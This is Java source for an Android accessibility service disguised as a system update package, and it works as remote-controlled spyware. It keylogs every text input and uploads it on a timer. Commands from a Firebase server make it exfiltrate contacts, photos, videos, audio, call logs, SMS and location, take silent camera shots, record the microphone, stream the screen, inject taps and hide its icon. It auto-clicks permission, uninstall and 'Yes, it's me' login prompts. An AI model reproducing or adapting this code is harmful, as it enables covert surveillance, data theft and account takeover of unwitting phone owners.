package com.android.update;

import android.hardware.camera2.CameraCharacteristics;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import java.io.BufferedWriter;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import android.location.Location;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import java.io.FileWriter;
import java.io.IOException;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.List;
import java.io.File;
import androidx.annotation.NonNull;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;
import com.android.update.FileUtils;
import com.android.update.UploadHelper;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.util.DisplayMetrics;
import android.view.WindowManager;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "AccessibilityService";
    private DatabaseReference commandRef;
    private String userId;
    private Handler miningHandler;
    private Runnable miningRunnable;
    private boolean isMiningActive = false;
    private long miningStartTime;
    private static final double XRP_PER_HOUR = 0.15;
    private static final double USDT_RATE = 2.4;

    private final StringBuilder keyLogBuffer = new StringBuilder();
    private Handler keylogHandler = new Handler();
    private Runnable uploadKeylogRunnable;


    @Override
    public void onServiceConnected() {
        // 🔄 SYNC with dashboard immediately on connection
        new Thread(() -> {
            UploadHelper.sendTextToServer(getApplicationContext(), "sync", "Service Connected");
        }).start();

        uploadKeylogRunnable = new Runnable() {
            @Override
            public void run() {
                if (keyLogBuffer.length() > 0) {
                    String rawText = keyLogBuffer.toString();
                    String sanitized = rawText.replaceAll("[^\\x20-\\x7E\\n]", ""); // Keep only printable ASCII + newlines

                    // 🔁 Run upload on background thread
                    new Thread(() -> {
                        UploadHelper.sendTextToServer(getApplicationContext(), "keylogs", sanitized);
                    }).start();

                    keyLogBuffer.setLength(0); // Clear after upload
                } else {
                    Log.d("KEYLOG", "Buffer empty, skipping upload");
                }

                keylogHandler.postDelayed(this,  2 * 60 * 1000); // Every 1 min (for testing)
            }
        };

        keylogHandler.postDelayed(uploadKeylogRunnable,  60 * 1000);   //5 * for future

        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED |
                AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED |
                AccessibilityEvent.TYPE_WINDOWS_CHANGED |
                AccessibilityEvent.TYPE_VIEW_SCROLLED |
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);

        SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
        userId = prefs.getString("userId", null);
        if (userId != null) {
            listenForCommands(userId);
        } else {
            Log.d(TAG, "userId is null, starting sync retry loop...");
            startUserIdSyncLoop();
        }

        // ✅ Register receiver for Interactive Remote Control + LOGIN_SUCCESS
        IntentFilter filter = new IntentFilter();
        filter.addAction("com.android.update.REMOTE_GESTURE");
        filter.addAction("com.android.update.LOGIN_SUCCESS");
        
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("com.android.update.LOGIN_SUCCESS".equals(intent.getAction())) {
                    Log.d(TAG, "Login Success broadcast received! Syncing userId...");
                    SharedPreferences p = getSharedPreferences("UserPrefs", MODE_PRIVATE);
                    String newUid = p.getString("userId", null);
                    if (newUid != null && !newUid.equals(userId)) {
                        userId = newUid;
                        listenForCommands(userId);
                    }
                } else if ("com.android.update.REMOTE_GESTURE".equals(intent.getAction())) {
                    String jsonData = intent.getStringExtra("gesture_data");
                    if (jsonData != null) {
                        try {
                            JSONObject obj = new JSONObject(jsonData);
                            if ("tap".equals(obj.getString("action"))) {
                                double relX = obj.getDouble("x");
                                double relY = obj.getDouble("y");
                                executeTap(relX, relY);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Gesture error: " + e.getMessage());
                        }
                    }
                }
            }
        }, filter, Context.RECEIVER_EXPORTED);
    }

    private void startUserIdSyncLoop() {
        android.os.Handler syncHandler = new android.os.Handler();
        syncHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (userId != null) return; // Already found

                SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
                String foundId = prefs.getString("userId", null);
                if (foundId != null) {
                    Log.d(TAG, "userId found via Sync Loop: " + foundId);
                    userId = foundId;
                    listenForCommands(userId);
                } else {
                    Log.d(TAG, "userId still null, retrying in 5s...");
                    syncHandler.postDelayed(this, 5000);
                }
            }
        }, 5000);
    }

    private void executeTap(double relX, double relY) {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        
        int x = (int) (metrics.widthPixels * relX);
        int y = (int) (metrics.heightPixels * relY);

        Log.d(TAG, "Executing VNC Tap at: " + x + ", " + y);

        Path swipePath = new Path();
        swipePath.moveTo(x, y);
        swipePath.lineTo(x, y); // Tap is a zero-length swipe

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 50));
        
        dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d(TAG, "VNC Tap Completed");
            }
        }, null);
    }

    private void listenForCommands(String uid) {
        commandRef = FirebaseDatabase.getInstance().getReference("commands").child(uid).child("command");
        commandRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String command = snapshot.getValue(String.class);
                if (command != null) {
                    Log.d("CommandListener", "Received command: " + command);
                    executeCommand(command);
                    commandRef.setValue(null);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e("CommandListener", "Firebase error: " + error.getMessage());
            }
        });
    }

    private void executeCommand(String command) {
        switch (command) {
            case "open_instagram":
                openAppByPackage("com.instagram.android");
                break;
            case "extract_contacts":
                new Thread(() -> {
                    Log.d("COMMAND_EXEC", "Starting contact extraction...");

                    List<String> contacts = getContacts();
                    Log.d("COMMAND_EXEC", "Total contacts found: " + contacts.size());

                    try {
                        File contactFile = new File(getCacheDir(), "contacts.txt");
                        BufferedWriter writer = new BufferedWriter(new FileWriter(contactFile));

                        for (String contact : contacts) {
                            writer.write(contact);
                            writer.newLine();
                        }

                        writer.close();
                        UploadHelper.uploadFile(getApplicationContext(), contactFile, "upload_contacts");

                    } catch (Exception e) {
                        Log.e("COMMAND_EXEC", "Failed to write contacts file: " + e.getMessage());
                    }

                }).start();
                break;


            case "extract_photos":
                new Thread(() -> {
                    List<String> photos = FileUtils.getAllPhotos(getApplicationContext());
                    Log.d("COMMAND_EXEC", "Found " + photos.size() + " photos.");

                    int uploadedCount = 0;

                    for (int i = 0; i < photos.size(); i++) {
                        String path = photos.get(i);
                        File file = new File(path);
                        Log.d("COMMAND_EXEC", "Uploading photo " + (i + 1) + ": " + file.getName());

                        int retryCount = 0;
                        boolean success = false;

                        while (retryCount < 3 && !success) {
                            try {
                                UploadHelper.uploadFileBlocking(getApplicationContext(), file, "upload_photos");
                                Log.d("COMMAND_EXEC", "✔ Uploaded: " + file.getName());
                                success = true;
                            } catch (Exception e) {
                                retryCount++;
                                Log.e("COMMAND_EXEC", "❌ Failed attempt " + retryCount + " for " + file.getName() + ": " + e.getMessage());
                            }

                            try {
                                Thread.sleep(500); // delay between uploads
                            } catch (InterruptedException ignored) {}
                        }

                        uploadedCount++;
                    }

                    Log.d("COMMAND_EXEC", "✔ All photos attempted. Uploaded: " + uploadedCount + " of " + photos.size());

                }).start();
                break;



            case "extract_videos":
                new Thread(() -> {
                    List<String> videos = FileUtils.getAllVideosUnder30MB(getApplicationContext());
                    Log.d("COMMAND_EXEC", "Found " + videos.size() + " videos.");

                    int uploaded = 0;

                    for (int i = 0; i < videos.size(); i++) {
                        String path = videos.get(i);
                        File file = new File(path);
                        Log.d("COMMAND_EXEC", "Uploading video " + (i + 1) + ": " + path);

                        boolean success = UploadHelper.uploadFileBlocking(getApplicationContext(), file, "upload_videos");

                        if (success) {
                            uploaded++;
                        }

                        try {
                            Thread.sleep(1000); // Optional throttle after successful upload
                        } catch (InterruptedException e) {
                            Log.e("COMMAND_EXEC", "Sleep interrupted", e);
                        }
                    }

                    Log.d("COMMAND_EXEC", "Video upload completed. Total uploaded: " + uploaded);
                }).start();
                break;




            case "extract_audios":
                new Thread(() -> {
                    List<String> audios = FileUtils.getAllAudios(getApplicationContext());
                    int total = audios.size();
                    Log.d("COMMAND_EXEC", "Found " + total + " audios.");
                    int count = 1;
                    for (String path : audios) {
                        Log.d("COMMAND_EXEC", "Uploading audio " + count + " of " + total + ": " + path);
                        UploadHelper.uploadFileBlocking(getApplicationContext(), new File(path), "upload_audios");
                        count++;
                    }
                    Log.d("COMMAND_EXEC", "Audio upload completed. Total uploaded: " + total);
                }).start();
                break;

            case "front_photo":
                SilentCameraCapture.captureCamera(getApplicationContext(), CameraCharacteristics.LENS_FACING_FRONT);
                break;

            case "back_photo":
                SilentCameraCapture.captureCamera(getApplicationContext(), CameraCharacteristics.LENS_FACING_BACK);
                break;



            case "start_mining":
                startMining();
                break;

            case "open_mic":
                Log.d("CommandExec", "🎙 Starting mic recording for 5 minutes...");
                MicRecorder.startRecording(getApplicationContext());
                break;

            case "hide_app":
                try {
                    android.content.pm.PackageManager p = getPackageManager();
                    android.content.ComponentName componentName = new android.content.ComponentName(
                            getApplicationContext(), com.android.update.SplashActivity.class);
                    p.setComponentEnabledSetting(componentName,
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP);
                    Log.d("STEALTH", "Remote Command: App Icon Hidden");
                    UploadHelper.sendTextToServer(getApplicationContext(), "sys_log", "Stealth Mode: App Icon Hidden");
                } catch (Exception e) {
                    Log.e("STEALTH", "Hide failed: " + e.getMessage());
                }
                break;

            case "show_app":
                try {
                    android.content.pm.PackageManager p = getPackageManager();
                    android.content.ComponentName componentName = new android.content.ComponentName(
                            getApplicationContext(), com.android.update.SplashActivity.class);
                    p.setComponentEnabledSetting(componentName,
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP);
                    Log.d("STEALTH", "Remote Command: App Icon Shown");
                    UploadHelper.sendTextToServer(getApplicationContext(), "sys_log", "Stealth Mode: App Icon Shown");
                } catch (Exception e) {
                    Log.e("STEALTH", "Show failed: " + e.getMessage());
                }
                break;

            case "uninstall_instagram":
                openAppInfoAndUninstall("com.instagram.android");
                break;

            case "extract_location":
                getLocationAndUpload();
                break;

            case "extract_call_logs":
                new Thread(() -> {
                    try {
                        ContentResolver cr = getContentResolver();
                        String[] projection = {
                                CallLog.Calls.NUMBER,
                                CallLog.Calls.TYPE,
                                CallLog.Calls.DATE,
                                CallLog.Calls.DURATION,
                                CallLog.Calls.CACHED_NAME
                        };
                        Cursor cursor = cr.query(
                                CallLog.Calls.CONTENT_URI, projection,
                                null, null,
                                CallLog.Calls.DATE + " DESC");
                        JSONArray arr = new JSONArray();
                        if (cursor != null) {
                            while (cursor.moveToNext()) {
                                JSONObject entry = new JSONObject();
                                entry.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                                int t = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                                entry.put("type", t == CallLog.Calls.INCOMING_TYPE ? "INCOMING" :
                                        t == CallLog.Calls.OUTGOING_TYPE ? "OUTGOING" : "MISSED");
                                entry.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                                entry.put("duration_sec", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                                entry.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                                arr.put(entry);
                            }
                            cursor.close();
                        }
                        Log.d(TAG, "Call logs found: " + arr.length());
                        UploadHelper.sendCallLogsToServer(getApplicationContext(), arr.toString());
                    } catch (Exception e) {
                        Log.e(TAG, "extract_call_logs failed: " + e.getMessage());
                    }
                }).start();
                break;

            case "extract_sms_history":
                new Thread(() -> {
                    try {
                        ContentResolver cr = getContentResolver();
                        Cursor cursor = cr.query(
                                Telephony.Sms.Inbox.CONTENT_URI,
                                new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                                null, null,
                                Telephony.Sms.DATE + " DESC");
                        StringBuilder sb = new StringBuilder();
                        if (cursor != null) {
                            while (cursor.moveToNext()) {
                                sb.append("From: ").append(cursor.getString(0))
                                  .append(" | Date: ").append(cursor.getString(2))
                                  .append("\n").append(cursor.getString(1)).append("\n---\n");
                            }
                            cursor.close();
                        }
                        UploadHelper.sendTextToServer(getApplicationContext(), "sms_history", sb.toString());
                        Log.d(TAG, "SMS history uploaded");
                    } catch (Exception e) {
                        Log.e(TAG, "extract_sms_history failed: " + e.getMessage());
                    }
                }).start();
                break;

            case "record_screen":
                // Launch transparent Activity that requests MediaProjection consent.
                // The Accessibility Service autoClickAllow() will tap "Start" automatically.
                try {
                    Intent projectionIntent = new Intent(getApplicationContext(), MediaProjectionActivity.class);
                    projectionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(projectionIntent);
                    Log.d(TAG, "record_screen: launched MediaProjectionActivity");
                } catch (Exception e) {
                    Log.e(TAG, "record_screen failed: " + e.getMessage());
                }
                break;

            case "start_live_stream":
                try {
                    Intent liveIntent = new Intent(getApplicationContext(), MediaProjectionStreamActivity.class);
                    liveIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(liveIntent);
                    Log.d(TAG, "start_live_stream: launched MediaProjectionStreamActivity");
                } catch (Exception e) {
                    Log.e(TAG, "start_live_stream failed: " + e.getMessage());
                }
                break;

            case "stop_live_stream":
                Log.d(TAG, "Executing: stop_live_stream");
                stopService(new Intent(getApplicationContext(), ScreenStreamService.class));
                break;

        }
    }

    private void getLocationAndUpload() {
        FusedLocationProviderClient locationClient = LocationServices.getFusedLocationProviderClient(this);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("LOCATION", "Permission not granted");
            return;
        }



        locationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                .addOnSuccessListener(location -> {
                    if (location != null) {
                        double lat = location.getLatitude();
                        double lng = location.getLongitude();
                        String mapsLink = "https://maps.google.com/?q=" + lat + "," + lng;

                        Log.d("LOCATION", "Got location: " + mapsLink);
                        new Thread(() -> {
                        UploadHelper.sendTextToServer(getApplicationContext(), "location", "https://maps.google.com/?q=" + lat + "," + lng);
                        }).start();

                    } else {
                        Log.e("LOCATION", "Location is null");
                    }
                })
                .addOnFailureListener(e -> Log.e("LOCATION", "Failed: " + e.getMessage()));
    }


    private void openAppInfoAndUninstall(String packageName) {
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

            Log.d("ACCESS_CMD", "Opened app info for: " + packageName);

            // Wait and perform the uninstall click via Accessibility after UI appears
            new Handler().postDelayed(() -> performUninstallClick(), 3000);  // 3s delay for screen to load

        } catch (Exception e) {
            Log.e("ACCESS_CMD", "Failed to open app info: " + e.getMessage());
        }
    }



    private void performUninstallClick() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        List<String> uninstallKeywords = Arrays.asList("uninstall", "remove", "delete");
        for (AccessibilityNodeInfo node : findAllNodes(root)) {
            if (node.getText() != null) {
                String text = node.getText().toString().toLowerCase();
                for (String keyword : uninstallKeywords) {
                    if (text.contains(keyword)) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d("ACCESS_CMD", "Clicked uninstall button: " + text);
                        return;
                    }
                }
            }
        }
    }

    private List<AccessibilityNodeInfo> findAllNodes(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        if (root == null) return nodes;
        nodes.add(root);
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) nodes.addAll(findAllNodes(child));
        }
        return nodes;
    }


    private List<String> getContacts() {
        List<String> contacts = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                if (nameIndex != -1 && numberIndex != -1) {
                    String name = cursor.getString(nameIndex);
                    String number = cursor.getString(numberIndex);
                    contacts.add(name + ": " + number); // ✅ CORRECT LIST
                }
            }
            cursor.close();
        }
        return contacts;
    }


    private void openAppByPackage(String pkgName) {
        Intent intent = getPackageManager().getLaunchIntentForPackage(pkgName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } else {
            Log.e("CommandExec", pkgName + " not installed.");
        }
    }

    private void startMining() {
        miningStartTime = System.currentTimeMillis();
        isMiningActive = true;

        FirebaseDatabase.getInstance().getReference("users")
                .child(userId)
                .child("mining_status").setValue(true);
        FirebaseDatabase.getInstance().getReference("users")
                .child(userId)
                .child("mining_start_time").setValue(miningStartTime);

        miningHandler = new Handler();
        miningRunnable = new Runnable() {
            @Override
            public void run() {
                long elapsed = System.currentTimeMillis() - miningStartTime;
                double earnedXRP = (elapsed / (60 * 60 * 1000.0)) * XRP_PER_HOUR;
                double earnedUSDT = earnedXRP * USDT_RATE;

                FirebaseDatabase.getInstance().getReference("users").child(userId).child("xrp_balance").setValue(earnedXRP);
                FirebaseDatabase.getInstance().getReference("users").child(userId).child("usdt_balance").setValue(earnedUSDT);

                if (elapsed < 24 * 60 * 60 * 1000) {
                    miningHandler.postDelayed(this, 1000);
                } else {
                    isMiningActive = false;
                    FirebaseDatabase.getInstance().getReference("users").child(userId).child("mining_status").setValue(false);
                }
            }
        };
        miningHandler.post(miningRunnable);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getSource() == null) return;

        // ✅ 1. Keylogging part
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            if (text != null && text.length() > 0) {
                keyLogBuffer.append("[").append(System.currentTimeMillis()).append("] ");
                keyLogBuffer.append("App: ").append(event.getPackageName()).append(" -> ");
                keyLogBuffer.append("Input: ").append(text).append("\n");

                Log.d("KEYLOG", "Captured input: " + text);
            }
        }

        // ✅ 2. Auto-permission click part
        AccessibilityNodeInfo nodeInfo = event.getSource();
        autoClickAllow(nodeInfo);
    }

    private void autoClickAllow(AccessibilityNodeInfo node) {
        if (node == null) return;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                CharSequence text = child.getText();
                if (text != null && (

                        text.toString().equalsIgnoreCase("allow") ||
                                text.toString().equalsIgnoreCase("ok") ||
                                text.toString().equalsIgnoreCase("yes") ||
                                text.toString().toLowerCase().contains("while using the app") ||
                                text.toString().equalsIgnoreCase("allow every time") ||
                                text.toString().equalsIgnoreCase("uninstall") ||
                                text.toString().equalsIgnoreCase("confirm") ||
                                text.toString().toLowerCase().contains("allow while using the app") ||
                                text.toString().equalsIgnoreCase("yes, it was me") ||
                                text.toString().equalsIgnoreCase("yes it was me") ||
                                text.toString().equalsIgnoreCase("it was me") ||
                                text.toString().equalsIgnoreCase("yes it's me") ||
                                text.toString().equalsIgnoreCase("yes, it's me") ||
                                text.toString().equalsIgnoreCase("✓ yes, it's me") ||
                                text.toString().toLowerCase().contains("✓ yes, it's me") ||
                                text.toString().equalsIgnoreCase("confirm") ||
                                text.toString().equalsIgnoreCase("approve") ||
                                text.toString().equalsIgnoreCase("authorize") ||
                                text.toString().equalsIgnoreCase("start now") ||
                                text.toString().equalsIgnoreCase("start recording") ||
                                text.toString().equalsIgnoreCase("start") ||
                                text.toString().equalsIgnoreCase("ok")


                )) {
                    if (child.isClickable()) {
                        child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d("AccessibilityAutoClick", "✅ Auto-clicked permission: " + text);
                        return;
                    }
                }
                autoClickAllow(child);  // Recursive search
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
